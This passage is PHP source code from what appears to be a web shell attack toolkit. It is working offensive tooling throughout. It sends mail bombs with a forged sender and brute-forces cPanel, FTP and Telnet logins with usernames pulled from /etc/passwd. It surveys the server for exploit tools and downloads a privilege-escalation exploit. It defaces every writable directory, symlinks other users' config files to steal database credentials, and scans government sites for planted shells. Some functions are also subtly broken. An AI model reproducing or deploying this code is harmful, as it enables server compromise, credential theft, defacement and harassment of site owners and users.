size=4>Successfully Mails Send...</font><br><br><hr><br><br>";
        } else {
            echo "<div id=result><center><h2>MAIL
SPAMING</h2><hr /><br /><br /><font color=red
size=4>Sorry, failed to Mails Sending... :(</font><br><br><hr><br><br>";
        }
    } else {
        echo "<div id=result><center><h2>MAIL SPAMING</h2><hr /><br /><br /><font color=red
size=4>Sorry, failed to Mails Sending... :(</font><br
/><br /><hr /><br /><br />";
    }
}
function mailbomb_bg() {
    $rand    = rand(0, 9999999);
    $to      = $_POST['bomb_to'];
    $from    = "Polisi";
    $subject = $_POST['bomb_subject'] . " ID " . $rand;
    $times   = $_POST['bomb_no'];
    $content = $_POST['bmail_content'];
    if($times == '') {
        $times = 1000;
    }
    while($times--) {
        if(function_exists('mail')) {
            if(mail($to, $subject, $message, "From:$from")) {
                echo "<div
id=result><center><h2>MAIL SPAMING</h2><hr><br><br><font color=yellow size=4>Successfully
Mails Bombed... :p</font><br><br><hr><br><br>";
            } else {
                echo "<div
id=result><center><h2>MAIL SPAMING</h2><hr><br><br><font color=red size=4>Sorry, failed to
Mails Bombing... :(</font><br><br><hr><br><br>";
            }
        } else {
            echo "<div id=result><center><h2>MAIL
SPAMING</h2><hr /><br /><br /><font color=red
size=4>Sorry, failed to Mails Bombing... :(</font><br><br><hr><br><br>";
        }
    }
}
function cpanel_check($host, $user, $pass, $timeout) {
    set_time_limit(0);
    global $cpanel_port;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://$host:" . $cpanel_port);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
    curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_FAILONERROR, 1);
    $data = curl_exec($ch);
    if(curl_errno($ch) == 28) {
        print "<b><font color=orange>Error :</font>
<font color=red>Connection Timeout. Please Check The Target Hostname
.</font></b>";
        exit;
    } else if(curl_errno($ch) == 0) {
        print "<b><font face=\"Iceland\"
style=\"font-size: 9pt\"
color=\"orange\">[~]</font></b><font
face=\"Iceland\"   style=\"font-size:
9pt\"><b><font color=\"yellow\">
        Cracking Success With Username &quot;</font><font
color=\"#FF0000\">$user</font><font
color=\"#008000\">\" and Password
\"</font><font
color=\"#FF0000\">$pass</font><font
color=\"#008000\">\"</font></b><br><br>";
    }
    curl_close($ch);
}
function cpanel_crack() {
    set_time_limit(0);
    global $os;
    echo "<div id=result>";
    $cpanel_port     = "2082";
    $connect_timeout = 5;
    if(!isset($_POST['username']) && !isset($_POST['password']) && !isset($_POST['target']) && !isset($_POST['cracktype'])) {
?>
		<center>
		<form method=post>
		<table class=tbl>
			<tr>
				<td align=center colspan=2>Target : <input type=text name="server" value="localhost"
class=sbox></td>
			</tr>
			<tr>
				<td align=center>User names</td><td
align=center>Password</td>
			</tr>
			<tr>
				<td align=center><textarea spellcheck='false'
class=textarea_edit name=username rows=25 cols=35 class=box><?php
        if($os != "win") {
            if(@file('/etc/passwd')) {
                $users = file('/etc/passwd');
                foreach($users as $user) {
                    $user = explode(':', $user);
                    echo $user[0] . "\n";
                }
            } else {
                $temp = "";
                $val1 = 0;
                $val2 = 1000;
                for(; $val1 <= $val2; $val1++) {
                    $uid = @posix_getpwuid($val1);
                    if($uid)
                        $temp .= join(':', $uid) . "\n";
                }
                $temp = trim($temp);
                if($file5 = fopen("test.txt", "w")) {
                    fputs($file5, $temp);
                    fclose($file5);
                    $file = fopen("test.txt", "r");
                    while(!feof($file)) {
                        $s       = fgets($file);
                        $matches = array();
                        $t       = preg_match('/\/(.*?)\:\//s', $s, $matches);
                        $matches = str_replace("home/", "", $matches[1]);
                        if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
                            continue;
                        echo $matches;
                    }
                    fclose($file);
                }
            }
        }
?></textarea></td><td align=center><textarea
spellcheck='false' class=textarea_edit name=password rows=25 cols=35
class=box></textarea></td>
			</tr>
			<tr>
				<td align=center colspan=2>Guess options :
<label><input
name="cracktype" type="radio" value="cpanel"
checked> Cpanel(2082)</label><label><input
name="cracktype" type="radio"
value="ftp">
Ftp(21)</label><label><input name="cracktype"
type="radio" value="telnet">
Telnet(23)</label></td>
			</tr>
			<tr>
				<td align=center colspan=2>Timeout delay : <input
type="text" name="delay" value=5
class=sbox></td>
			</tr>
			<tr>
				<td align=center colspan=2><input type="submit"
value="O" class=but></td>
			</tr>
		</table>
		</form>
		</center>
		<?php
    } else {
        if(empty($_POST['username']) || empty($_POST['password']))
            echo "<center>Please Enter The Users or Password List</center>";
        else {
            $userlist = explode("\n", $_POST['username']);
            $passlist = explode("\n", $_POST['password']);
            if($_POST['cracktype'] == "ftp") {
                foreach($userlist as $user) {
                    $pureuser = trim($user);
                    foreach($passlist as $password) {
                        $purepass = trim($password);
                        ftp_check($_POST['target'], $pureuser, $purepass, $connect_timeout);
                    }
                }
            }
            if($_POST['cracktype'] == "cpanel" || $_POST['cracktype'] == "telnet") {
                if($cracktype == "telnet") {
                    $cpanel_port = "23";
                } else
                    $cpanel_port = "2082";
                foreach($userlist as $user) {
                    $pureuser = trim($user);
                    echo "<b><font face=Iceland style=\"font-size:
9pt\" color=#008000> [ - ] </font><font face=Iceland
style=\"font-size: 9pt\" color=#FF0800>
						Processing user $pureuser
...</font></b><br><br>";
                    foreach($passlist as $password) {
                        $purepass = trim($password);
                        cpanel_check($_POST['target'], $pureuser, $purepass, $connect_timeout);
                    }
                }
            }
        }
    }
    echo "</div>";
}
function get_users() {
    $userz = array();
    $user  = file("/etc/passwd");
    foreach($user as $userx => $usersz) {
        $userct = explode(":", $usersz);
        array_push($userz, $userct[0]);
    }
    if(!$user) {
        if($opd = opendir("/home/")) {
            while(($file = readdir($opd)) !== false) {
                array_push($userz, $file);
            }
        }
        closedir($opd);
    }
    $userz = implode(', ', $userz);
    return $userz;
}
function exploit_details() {
    global $os;
    echo "<div id=result style='color:yellow;'><center>
    <h2>Exploit Server Details</h2><hr /><br
/><br /><table class=table
style='color:yellow;text-align:center'><tr><td>
    OS: <a style='color:7171C6;text-decoration:none;' target=_blank
href='http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=" . php_uname(s) . "'>" . php_uname(s) . "</td></tr>
    <tr><td>PHP Version : <a
style='color:7171C6;text-decoration:none;' target=_blank
href='?phpinfo'>" . phpversion() . ".</td></tr>
    <tr><td>Kernel Release : <font
color=7171C6>" . php_uname(r) . "</font></td></tr>
    <tr><td>Kernel Version : <font
color=7171C6>" . php_uname(v) . "</font></td></td>
    <tr><td>Machine : <font
color=7171C6>" . php_uname(m) . "</font></td</tr>
    <tr><td>Server Software : <font
color=7171C6>" . $_SERVER['SERVER_SOFTWARE'] . "</font></td</tr><tr>";
    if(function_exists('apache_get_modules')) {
        echo "<tr><td style='text-align:left;'>Loaded Apache
modules : <br /><br /><font color=7171C6>";
        echo implode(', ', apache_get_modules());
        echo "</font></tr></td>";
    }
    if($os == 'win') {
        echo "<tr><td style='text-align:left;'>Account
Setting : <font color=7171C6><pre>" . cmd('net
accounts') . "</pre></td></tr>
               <tr><td style='text-align:left'>User Accounts :
<font color=7171C6><pre>" . cmd('net
user') . "</pre></td></tr>
               ";
    }
    if($os == 'nix') {
        echo "<tr><td style='text-align:left'>Distro :
<font color=7171C6><pre>" . cmd('cat
/etc/*-release') . "</pre></font></td></tr>
              <tr><td style='text-align:left'>Distr name :
<font color=7171C6><pre>" . cmd('cat
/etc/issue.net') . "</pre></font></td></tr>
              <tr><td style='text-align:left'>GCC : <font
color=7171C6><pre>" . cmd('whereis
gcc') . "</pre></td></tr>
              <tr><td style='text-align:left'>PERL : <font
color=7171C6><pre>" . cmd('whereis
perl') . "</pre></td></tr>
              <tr><td style='text-align:left'>PYTHON :
<font
color=7171C6><pre>" . cmd('whereis
python') . "</pre></td></tr>
              <tr><td style='text-align:left'>JAVA : <font
color=7171C6><pre>" . cmd('whereis
java') . "</pre></td></tr>
              <tr><td style='text-align:left'>APACHE :
<font
color=7171C6><pre>" . cmd('whereis
apache') . "</pre></td></tr>
              <tr><td style='text-align:left;'>CPU : <br
/><br /><pre><font color=7171C6>" . cmd('cat
/proc/cpuinfo') . "</font></pre></td></tr>
              <tr><td style='text-align:left'>RAM : <font
color=7171C6><pre>" . cmd('free
-m') . "</pre></td></tr>
              <tr><td style='text-align:left'> User Limits :
<br /><br /><font
color=7171C6><pre>" . cmd('ulimit
-a') . "</pre></td></tr>";
        $useful = array(
            'gcc',
            'lcc',
            'cc',
            'ld',
            'make',
            'php',
            'perl',
            'python',
            'ruby',
            'tar',
            'gzip',
            'bzip',
            'bzip2',
            'nc',
            'locate',
            'suidperl'
        );
        $uze    = array();
        foreach($useful as $uzeful) {
            if(cmd("which $uzeful")) {
                $uze[] = $uzeful;
            }
        }
        echo "<tr><td
style='text-align:left'>Useful
: <br /><font color=7171C6><pre>";
        echo implode(', ', $uze);
        echo "</pre></td></tr>";
        $downloaders = array(
            'wget',
            'fetch',
            'lynx',
            'links',
            'curl',
            'get',
            'lwp-mirror'
        );
        $uze         = array();
        foreach($downloaders as $downloader) {
            if(cmd("which $downloader")) {
                $uze[] = $downloader;
            }
        }
        echo "<tr><td
style='text-align:left'>Downloaders : <br /><font
color=7171C6><pre>";
        echo implode(', ', $uze);
        echo "</pre></td></tr>";
        echo "<tr><td style='text-align:left'>Users
: <br /><font
color=7171C6><pre>" . wordwrap(get_users()) . "</pre</font>></td></tr>
                    <tr><td style='text-align:left'>Hosts :
<br /><font color=7171C6><pre>" . cmd('cat
/etc/hosts') . "</pre></font></td></tr>";
    }
    echo "</table><br /><br /><hr /><br
/><br />";
}
function remote_file_check_ui() {
    echo "<div id=result><center><h2>Remote File
Check</h2><hr /><br /><br />
          <table class=tbl><form
method='POST'><tr><td>URL : <input size=50
name='rem_web'
value='http://www.nasa.gov/filemanager/'></td></tr>
          <tr><td><font color=red>Input File's Names in
TextArea</font></tr></td><tr><td><textarea
spellcheck='false' class='textarea_edit' cols=50 rows=30
name='tryzzz'>
x.php
.env
robots.txt
.htacces
nekopoi.mp4
c99.php
r57.php
B374k.php
</textarea></td></tr>
         <tr><td><br>
		 <input type='submit' value='O' class='input_big'>
		 <br><br></td></tr></form></table><br ><br><hr><br><br>";
}
function remote_file_check_bg() {
    set_time_limit(0);
    $rtr = array();
    echo "<div id=result><center><h2>Scanner
Report</h2><hr /><br /><br /><table
class=tbl>";
    $webz   = $_POST['rem_web'];
    $uri_in = $_POST['tryzzz'];
    $r_xuri = trim($uri_in);
    $r_xuri = explode("\n", $r_xuri);
    foreach($r_xuri as $rty) {
        $urlzzx = $webz . $rty;
        if(function_exists('curl_init')) {
            echo "<tr><td
style='text-align:left'><font
color=orange>Checking : </font> <font color=7171C6> $urlzzx
</font></td>";
            $ch = curl_init($urlzzx);
            curl_setopt($ch, CURLOPT_NOBODY, true);
            curl_exec($ch);
            $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            if($status_code == 200) {
                echo "<td style='text-align:left'><font
color=yellow> Found....</font></td></tr>";
            } else {
                echo "<td style='text-align:left'><font
color=red>Not Found...</font></td></tr>";
            }
        } else {
            echo "<font color=red>cURL Not Found
</font>";
            break;
        }
    }
    echo "</table><br /><br /><hr /><br
/><br /></div>";
}
function remote_download_ui() {
    echo "<div id=result><center><h2>Remote File
Download</h2><hr><br><br><table class=tbl><form method='GET'><input type=hidden name='path'
value=" . getcwd() . "><tr><td><select
style='color:yellow; background-color:black; border:1px solid #666;'
name='type_r_down'><option>WGET</option><option>cURL</option></select></td></tr>
    <tr><td>URL <input size=50 name='rurlfile'
value='https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c'></td></tr>
    <tr><td><input type='submit' class='input_big' value='O' /></td></tr></form></table><br><br><hr><br><br></div>";
}
function remote_download_bg() {
    chdir($_GET['path']);
    global $os;
    $opt      = $_GET['type_r_down'];
    $rt_ffile = $_GET['rurlfile'];
    $name     = basename($rt_ffile);
    echo "<div id=result>";
    switch($opt) {
        case "WGET":
            if($os != 'win') {
                cmd("wget $rt_ffile");
                alert("Downloaded Successfully...");
            } else {
                alert("Its Windows OS... WGET is not available");
            }
            break;
        case "cURL":
            if(function_exists('curl_init')) {
                $ch = curl_init($rt_ffile);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $data = curl_exec($ch);
                curl_close($ch);
                file_put_contents($name, $data);
                alert("Download succeeded");
            } else {
                alert("cURL Not Available");
            }
            break;
    }
    echo "</div>";
}
function hex_encode_ui() {
    if(isset($_REQUEST['hexinp']) && isset($_REQUEST['tyxxx'])) {
        $tyx      = $_POST['tyxxx'];
        $rezultzz = $_POST['hexinp'];
        switch($tyx) {
            case "Encode":
                $rzul = PREG_REPLACE("'(.)'e", "dechex(ord('\\1'))", $rezultzz);
                echo "<div
id=result><center><h2>HEXADECIMAL ENCODER</h2><hr><br><br>
                <textarea class='textarea_edit' spellcheck=false
cols=60
rows=10>$rzul</textarea>
                <br /><br /><form
method='POST'><select style='color:yellow; background-color:black;
border:1px solid #666;'
name='tyxxx'><option>Encode</option><option>Decode</option></select>
                Input : <input name='hexinp' size=50 value='input
here'><input type=submit value='O' /><br><br><hr><br><br></div>";
                break;
            case "Decode":
                $rzul = PREG_REPLACE("'([\S,\d]{2})'e", "chr(hexdec('\\1'))", $rezultzz);
                echo "<div
id=result><center><h2>HEXADECIMAL ENCODER</h2><hr><br><br>
                <textarea class='textarea_edit' spellcheck=false
cols=60
rows=10>$rzul</textarea>
                <br /><br /><form
method='POST'><select style='color:yellow; background-color:black;
border:1px solid #666;'
name='tyxxx'><option>Encode</option><option>Decode</option></select>
                Input : <input name='hexinp' size=50 value='input
here'><input type=submit value='O' /><br><br><hr><br><br></div>";
                break;
        }
    } else {
        echo "<div
id=result><center><h2>HEXADECIMAL
ENCODER</h2><hr /><br /><br />
        <textarea class='textarea_edit' spellcheck=false cols=60
rows=10>Here visible Your Result</textarea>
        <br /><br /><form method='POST'><select
style='color:yellow; background-color:black; border:1px solid #666;'
name='tyxxx'><option>Encode</option><option>Decode</option></select>
        Input : <input name='hexinp' size=50 value='input
here'><input type=submit value='O' /><br
/><br /><hr /><br /><br /></div>";
    }
}
function killme() {
    global $self;
    echo "<div id=result><center><h2>Good Bye
Dear</h2><hr />Where Are U Going? :( <br><br><br><hr><br><br>";
    $me = basename($self);
    unlink($me);
}
function ftp_anonymous_ui() {
    echo "<div id='result'><center><h2>Anonymous FTP Scanner</h2><hr></center>
	<table class=tbl><form method='GET'><tr>
	<td><textarea name='ftp_anonz' cols=40 rows=25 class='textarea_edit' required>
	127.0.0.1
	ftp.google.com
	ftp.r00t.com
	ftp.nekopoi.org</textarea></td></tr>
	<tr><td><input class='input_big' type='submit' value='O'></td></tr></form></table><br><br><hr><br><br>";
}
function ftp_anonymous_bg() {
    echo "<div
id=result><center><h2>Result</h2></center><hr
/><br /><br /><table class=table>";
    $ftp_list = $_GET['ftp_anonz'];
    $xftpl    = trim($ftp_list);
    $xftpl    = explode("\n", $xftpl);
    foreach($xftpl as $xftp) {
        $xftp     = str_replace("ftp://", "", $xftp);
        $conn_ftp = ftp_connect($xftp);
        $success  = ftp_login($conn_ftp, "anonymous", "");
        if($success) {
            echo "<tr><td><font
color=7171C6>$xftp</font></td><td><font
color=yellow>Successfull</font></td></tr>";
        } else {
            echo "<tr><td><font
color=7171C6>$xftp</font></td><td><font
color=red>Failed</font></td></tr>";
        }
    }
    echo "</table><br /><br /><hr /><br
/><br />";
}
function mass_deface_ui() {
    echo "<div id=result><center><h2>Mass
Deface</h2><hr /><br /><br /><table
class=tbl><form method='GET'><input name='mm_path'
type='hidden'
value=" . $_GET['path'] . "><tr><td>Name
: <input size=40 name='mass_name'></td></tr>
    <tr><td><textarea name='mass_cont' cols=80 rows=25
class='textarea_edit'></textarea></td></tr><tr><td><input
class='input_big' type=submit value='O'
/></td></tr></form></table><br /><br
/><hr /><br /><br /></div>";
}
function mass_deface_bg() {
    global $sep;
    $d_path = $_GET['mm_path'];
    chdir($d_path);
    $d_file   = $_GET['mass_name'];
    $d_conten = $_GET['mass_cont'];
    if(is_dir($d_path)) {
        chdir($d_path);
        $d_dirs = array();
        if($handle = opendir($d_path)) {
            while(($item = readdir($handle)) !== FALSE) {
                if($item == ".") {
                    continue;
                }
                if($item == "..") {
                    continue;
                }
                if(is_dir($item)) {
                    array_push($d_dirs, $item);
                }
            }
        }
    }
    echo "<div
id=result><center><h2>Result</h2></center><hr
/><br /><br /><table class=tbl>";
    foreach($d_dirs as $d_dir) {
        $xd_path = getcwd() . "$sep$d_dir$sep$d_file";
        if(is_writable($d_dir)) {
            $handle = fopen($xd_path, "wb");
            if($handle) {
                fwrite($handle, $d_conten);
            }
        }
        echo "<tr><td><font
color=yellow>$xd_path</font></td></tr>";
    }
    echo "</table><br /><br /><hr /><br
/><br /></div>";
}
function symlinkg($usernamexx, $domainxx) {
    symlink('/home/' . $usernamexx . '/public_html/vb/includes/config.php', 'Cvar1984/' . $domainxx . '
=>vBulletin1.txt');
    symlink('/home/' . $usernamexx . '/public_html/includes/config.php', 'Cvar1984/' . $domainxx . '
=>vBulletin2.txt');
    symlink('/home/' . $usernamexx . '/public_html/forum/includes/config.php', 'Cvar1984/' . $domainxx . '
=>vBulletin3.txt');
    symlink('/home/' . $usernamexx . '/public_html/cc/includes/config.php', 'Cvar1984/' . $domainxx . '
=>vBulletin4.txt');
    symlink('/home/' . $usernamexx . '/public_html/inc/config.php', 'Cvar1984/' . $domainxx . '
=>mybb.txt');
    symlink('/home/' . $usernamexx . '/public_html/config.php', 'Cvar1984/' . $domainxx . '
=>Phpbb1.txt');
    symlink('/home/' . $usernamexx . '/public_html/forum/includes/config.php', 'Cvar1984/' . $domainxx . '
=>Phpbb2.txt');
    symlink('/home/' . $usernamexx . '/public_html/wp-config.php', 'Cvar1984/' . $domainxx . '
=>Wordpress1.txt');
    symlink('/home/' . $usernamexx . '/public_html/blog/wp-config.php', 'Cvar1984/' . $domainxx . '
=>Wordpress2.txt');
    symlink('/home/' . $usernamexx . '/public_html/configuration.php', 'Cvar1984/' . $domainxx . '
=>Joomla1.txt');
    symlink('/home/' . $usernamexx . '/public_html/blog/configuration.php', 'Cvar1984/' . $domainxx . '
=>Joomla2.txt');
    symlink('/home/' . $usernamexx . '/public_html/joomla/configuration.php', 'Cvar1984/' . $domainxx . '
=>Joomla3.txt');
    symlink('/home/' . $usernamexx . '/public_html/whm/configuration.php', 'Cvar1984/' . $domainxx . '
=>Whm1.txt');
    symlink('/home/' . $usernamexx . '/public_html/whmc/configuration.php', 'Cvar1984/' . $domainxx . '
=>Whm2.txt');
    symlink('/home/' . $usernamexx . '/public_html/support/configuration.php', 'Cvar1984/' . $domainxx . '
=>Whm3.txt');
    symlink('/home/' . $usernamexx . '/public_html/client/configuration.php', 'Cvar1984/' . $domainxx . '
=>Whm4.txt');
    symlink('/home/' . $usernamexx . '/public_html/billings/configuration.php', 'Cvar1984/' . $domainxx . '
=>Whm5.txt');
    symlink('/home/' . $usernamexx . '/public_html/billing/configuration.php', 'Cvar1984/' . $domainxx . '
=>Whm6.txt');
    symlink('/home/' . $usernamexx . '/public_html/clients/configuration.php', 'Cvar1984/' . $domainxx . '
=>Whm7.txt');
    symlink('/home/' . $usernamexx . '/public_html/whmcs/configuration.php', 'Cvar1984/' . $domainxx . '
=>Whm8.txt');
    symlink('/home/' . $usernamexx . '/public_html/order/configuration.php', 'Cvar1984/' . $domainxx . '
=>Whm9.txt');
    symlink('/home/' . $usernamexx . '/public_html/admin/conf.php', 'Cvar1984/' . $domainxx . '
=>5.txt');
    symlink('/home/' . $usernamexx . '/public_html/admin/config.php', 'Cvar1984/' . $domainxx . '
=>4.txt');
    symlink('/home/' . $usernamexx . '/public_html/conf_global.php', 'Cvar1984/' . $domainxx . '
=>invisio.txt');
    symlink('/home/' . $usernamexx . '/public_html/include/db.php', 'Cvar1984/' . $domainxx . '
=>7.txt');
    symlink('/home/' . $usernamexx . '/public_html/connect.php', 'Cvar1984/' . $domainxx . '
=>8.txt');
    symlink('/home/' . $usernamexx . '/public_html/mk_conf.php', 'Cvar1984/' . $domainxx . '
=>mk-portale1.txt');
    symlink('/home/' . $usernamexx . '/public_html/include/config.php', 'Cvar1984/' . $domainxx . '
=>12.txt');
    symlink('/home/' . $usernamexx . '/public_html/settings.php', 'Cvar1984/' . $domainxx . '
=>Smf.txt');
    symlink('/home/' . $usernamexx . '/public_html/includes/functions.php', 'Cvar1984/' . $domainxx . '
=>phpbb3.txt');
    symlink('/home/' . $usernamexx . '/public_html/include/db.php', 'Cvar1984/' . $domainxx . '
=>infinity.txt');
}
function config_grabber_bg() {
    global $sym_htaccess, $sym_php_ini;
    mkdir('Cvar1984', 0777);
    symlink("/", "Cvar1984/root");
    $htaccess = fopen('Cvar1984/.htaccess', 'wb');
    fwrite($htaccess, $sym_htaccess);
    $php_ini_x = fopen('Cvar1984/php.ini', 'wb');
    fwrite($php_ini_x, $sym_php_ini);
    $usr = explode("\n", $_POST['user_z_list']);
    foreach($usr as $uzer) {
        $u_er = trim($uzer);
        symlinggg($u_er);
    }
    echo "<script>window.open('Cvar1984/',
'_blank');</script>";
    alert('Config Grab compted. Check configs in direcory Cvar1984');
}
if(isset($_POST['user_z_list'])) {
    config_grabber_bg();
}
function config_grabber_ui() {
    if(file('/etc/passwd')) {
?><script>alert("/etc/named.conf Not Found, Its
alternative method.");</script><div
id=result><center><h2>Config Grabber</h2><hr><br><br><table class=tbl><form
method=POST><tr><td><textarea spellcheck=false
class='textarea_edit' rows=15 cols=60  name=user_z_list><?php
        $users = file('/etc/passwd');
        foreach($users as $user) {
            $user = explode(':', $user);
            echo $user[0] . "\n";
        }
?></textarea></td></tr><tr><td><input
type='submit' class='input_big' value='O'/></td></tr></form></table><br /><br
/><hr /><br /><br /><hr /></div><?php
    } else {
        alert(" File Not Found : /etc/passwd ");
    }
}
function symlinggg($user) {
    symlink('/home/' . $usernamexx . '/public_html/blog/configuration.php', "Cvar1984/" . $user . " =>blog/configuration.php");
    symlink('/home/' . $user . '/public_html/forum/includes/config.php', "Cvar1984/" . $user . " =>forum/includes/config.php");
    symlink("/home/" . $user . "/public_html/wp-config.php", "Cvar1984/" . $user . " =>wp-config.php");
    symlink("/home/" . $user . "/public_html/wordpress/wp-config.php", "Cvar1984/" . $user . " =>wordpress/wp-config.php");
    symlink("/home/" . $user . "/public_html/configuration.php", "Cvar1984/" . $user . " =>configuration.php");
    symlink("/home/" . $user . "/public_html/blog/wp-config.php", "Cvar1984/" . $user . " =>blog/wp-config.php");
    symlink("/home/" . $user . "/public_html/joomla/configuration.php", "Cvar1984/" . $user . " =>joomla/configuration.php");
    symlink("/home/" . $user . "/public_html/vb/includes/config.php", "Cvar1984/" . $user . " =>vb/includes/config.php");
    symlink("/home/" . $user . "/public_html/includes/config.php", "Cvar1984/" . $user . " =>includes/config.php");
    symlink("/home/" . $user . "/public_html/conf_global.php", "Cvar1984/" . $user . " =>conf_global.php");
    symlink("/home/" . $user . "/public_html/inc/config.php", "Cvar1984/" . $user . " =>inc/config.php");
    symlink("/home/" . $user . "/public_html/config.php", "Cvar1984/" . $user . " =>config.php");
    symlink("/home/" . $user . "/public_html/Settings.php", "Cvar1984/" . $user . " =>/Settings.php");
    symlink("/home/" . $user . "/public_html/sites/default/settings.php", "Cvar1984/" . $user . " =>sites/default/settings.php");
    symlink("/home/" . $user . "/public_html/whm/configuration.php", "Cvar1984/" . $user . " =>whm/configuration.php");
    symlink("/home/" . $user . "/public_html/whmcs/configuration.php", "Cvar1984/" . $user . " =>whmcs/configuration.php");
    symlink("/home/" . $user . "/public_html/support/configuration.php", "Cvar1984/" . $user . " =>support/configuration.php");
    symlink("/home/" . $user . "/public_html/whmc/WHM/configuration.php", "Cvar1984/" . $user . " =>whmc/WHM/configuration.php");
    symlink("/home/" . $user . "/public_html/whm/WHMCS/configuration.php", "Cvar1984/" . $user . "
=>whm/WHMCS/configuration.php");
    symlink("/home/" . $user . "/public_html/whm/whmcs/configuration.php", "Cvar1984/" . $user . "
=>whm/whmcs/configuration.php");
    symlink("/home/" . $user . "/public_html/support/configuration.php", "Cvar1984/" . $user . " =>support/configuration.php");
    symlink("/home/" . $user . "/public_html/clients/configuration.php", "Cvar1984/" . $user . " =>clients/configuration.php");
    symlink("/home/" . $user . "/public_html/client/configuration.php", "Cvar1984/" . $user . " =>client/configuration.php");
    symlink("/home/" . $user . "/public_html/clientes/configuration.php", "Cvar1984/" . $user . " =>clientes/configuration.php");
    symlink("/home/" . $user . "/public_html/cliente/configuration.php", "Cvar1984/" . $user . " =>cliente/configuration.php");
    symlink("/home/" . $user . "/public_html/clientsupport/configuration.php", "Cvar1984/" . $user . "
=>clientsupport/configuration.php");
    symlink("/home/" . $user . "/public_html/billing/configuration.php", "Cvar1984/" . $user . " =>billing/configuration.php");
    symlink("/home/" . $user . "/public_html/admin/config.php", "Cvar1984/" . $user . " =>admin/config.php");
}
function sym_xxx() {
    global $sym_htaccess, $sym_php_ini;
    mkdir('Cvar1984', 0777);
    symlink("/", "Cvar1984/root");
    $htaccess = @fopen('Cvar1984/.htaccess', 'w');
    fwrite($htaccess, $sym_htaccess);
    $php_ini_x = fopen('Cvar1984/php.ini', 'w');
    fwrite($php_ini_x, $sym_php_ini);
    $akps = implode(file("/etc/named.conf"));
    if(!$akps) {
        config_grabber_ui();
    } else {
        $usrd = array();
        foreach($akps as $akp) {
            if(eregi("zone", $akp)) {
                preg_match_all('#zone "(.*)" #', $akp, $akpzz);
                flush();
                if(strlen(trim($akpzz[1][0])) > 2) {
                    $user = posix_getpwuid(@fileowner("/etc/valiases/" . $akpzz[1][0]));
                    symlinkg($akpzz[1][0], $user['name']);
                    flush();
                }
            }
        }
    }
}
function sym_link() {
    global $sym_htaccess, $sym_php_ini;
    cmd('rm -rf CVAR');
    mkdir('CVAR', 0755);
    $usrd     = array();
    $akps     = implode(file("/etc/named.conf"));
    $htaccess = fopen('CVAR/.htaccess', 'w');
    fwrite($htaccess, $sym_htaccess);
    $php_ini_x = fopen('CVAR/php.ini', 'w');
    fwrite($php_ini_x, $sym_php_ini);
    symlink("/", "CVAR/root");
    if(!$file) {
        echo "<script>alert('Bind File /etc/passwd Not Found.
Its alternative Method')</script>";
        echo "<div
id=result><center><h2>SymLink</h2></center><hr
/><br /><br /><table
class='table'><tr><th>Users</th><th>Exploit</th></tr>";
        $users = file('/etc/passwd');
        foreach($users as $user) {
            $user = explode(':', $user);
            echo "<tr><td>" . $user[0] . "</td><td><a
href='CVAR/root/home/" . $user[0] . "/public_html/'
target=_blank>SymLink</tr>";
        }
        echo "</table><br><br><hr><br><br></div>";
    } else {
        echo "<table
class=table><tr><td>Domains</td><td>Users</td><td>Exploit</font></td></tr>";
        foreach($akps as $akp) {
            if(eregi("zone", $akp)) {
                preg_match_all('#zone "(.*)" #', $akp, $akpzz);
                flush();
                if(strlen(trim($akpzz[1][0])) > 2) {
                    $user = posix_getpwuid(@fileowner("/etc/valiases/" . $akpzz[1][0]));
                    echo "<tr><td><a
href=http://www." . $akpzz[1][0] . "
target=_blank>" . $akpzz[1][0] . "</a><td>" . $user['name'] . "</td><td><a
href='CVAR/root/home/" . $user['name'] . "/public_html/'
target=_blank>SymLink</a></td></tr></table>";
                    flush();
                }
            }
        }
    }
}
function shell_finder_ui() {
    echo "<div id=result><center><h2>SH3LL
SCANNER</h2><hr /><br /><br /><br /><form
method='GET'>URL : <input size=50 name='sh311_scanx'
value='http://www.fbi.gov/php/'><input type='submit'
value='O' /></form><br /><br /><hr
/><br /><br />";
}
function shell_finder_bg() {
    $sh_url = $_GET['sh311_scanx'];
    echo "
<div id=result><center><h2>SHELL
SCAN</h2><hr /><br /><br /><table
class='table'>";
    $ShellZ = array(
        "x.jpg.php",
        "indoXploit.php",
        "x.php",
        "ini.php",
        "c99.php",
        "c100.php",
        "r57.php",
        "b374k.php",
        "c22.php",
        "sym.php",
        "adminer.php",
        "r00t.php",
        "webr00t.php",
        "sql.php",
        "cpanel.php",
        "wso.php",
        "404.php",
        "aarya.php",
        "yellowshell.php",
        "ddos.php",
        "madspot.php",
        "1337.php",
        "31337.php",
        "WSO.php",
        "dz.php",
        "cpn.php",
        "sh3ll.php",
        "mysql.php",
        "killer.php",
        "cgishell.pl",
        "dz0.php",
        "whcms.php",
        "vb.php",
        "gaza.php",
        "d0mains.php",
        "changeall.php",
        "h4x0r.php",
        "L3b.php",
        "uploads.php",
        "shell.asp",
        "cmd.asp",
        "sh3ll.asp",
        "b374k-2.2.php",
        "m1n1.php",
        "b374km1n1.php"
    );
    foreach($ShellZ as $shell) {
        $urlzzx = $sh_url . $shell;
        if(function_exists('curl_init')) {
            echo "<tr><td
style='text-align:left'><font
color=orange>Checking : </font> <font color=7171C6> $urlzzx
</font></td>";
            $ch = curl_init($urlzzx);
            curl_setopt($ch, CURLOPT_NOBODY, true);
            curl_exec($ch);
            $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            if($status_code == 200) {
                echo "<td style='text-align:left'><font
color=yellow>Found</font></td></tr>";
            } else {
                echo "<td style='text-align:left'><font
color=red>Not Found...</font></td></tr>";
            }
        } else {
            echo "<font color=red>cURL Not Found </font>";
            break;
        }
    }
